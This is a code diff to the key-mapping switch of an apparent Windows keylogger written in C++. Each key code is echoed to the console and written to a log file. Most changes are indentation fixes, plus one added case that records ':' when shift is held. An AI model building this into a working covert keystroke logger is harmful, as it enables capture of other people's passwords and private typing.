@@ -30,60 +30,61 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case 48:
-			std::cout << "0";
-			WriteToFile("0");
+		std::cout << "0";
+		WriteToFile("0");
 		break;
 
 	case 49:
-			std::cout << "1";
-			WriteToFile("1");
-		
+		std::cout << "1";
+		WriteToFile("1");
+
 		break;
 
 	case 50:
-			std::cout << "2";
-			WriteToFile("2");
+		std::cout << "2";
+		WriteToFile("2");
 		break;
 
 	case 51:
-			std::cout << "3";
-			WriteToFile("3");
+		std::cout << "3";
+		WriteToFile("3");
 		break;
 
 	case 52:
-			std::cout << "4";
-			WriteToFile("4");
-			break;
+		std::cout << "4";
+		WriteToFile("4");
+		break;
 
 	case 53:
-			std::cout << "5";
-			WriteToFile("5");
+		std::cout << "5";
+		WriteToFile("5");
 		break;
 
 	case 54:
-			std::cout << "6";
-			WriteToFile("6");
+		std::cout << "6";
+		WriteToFile("6");
 		break;
 
 	case 55:
-			std::cout << "7";
-			WriteToFile("7");
+		std::cout << "7";
+		WriteToFile("7");
 		break;
 
 	case 56:
-			std::cout << "8";
-			WriteToFile("8");
+		std::cout << "8";
+		WriteToFile("8");
 		break;
 
 	case 57:
-			std::cout << "9";
-			WriteToFile("9");
+		std::cout << "9";
+		WriteToFile("9");
 		break;
 
 	case 58:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			
+			std::cout << ":";
+			WriteToFile(":");
 		}
 		break;
 
@@ -134,7 +135,7 @@ bool Key_is_Listed(WORD iKey)
 		std::cout << "\b";
 		WriteToFile("\b");
 		break;
-		
+
 
 	case VK_ESCAPE:
 		std::cout << " *Esc* ";
@@ -149,7 +150,7 @@ bool Key_is_Listed(WORD iKey)
 	case VK_DOWN:
 		std::cout << " btn_down ";
 		WriteToFile(" btn_down ");
-		break; 
+		break;
 
 	case VK_LEFT:
 		std::cout << " btn_left ";
@@ -176,7 +177,7 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" Delete ");
 		break;
 
-		
+
 
 	case 'A':
 		std::cout << " A ";
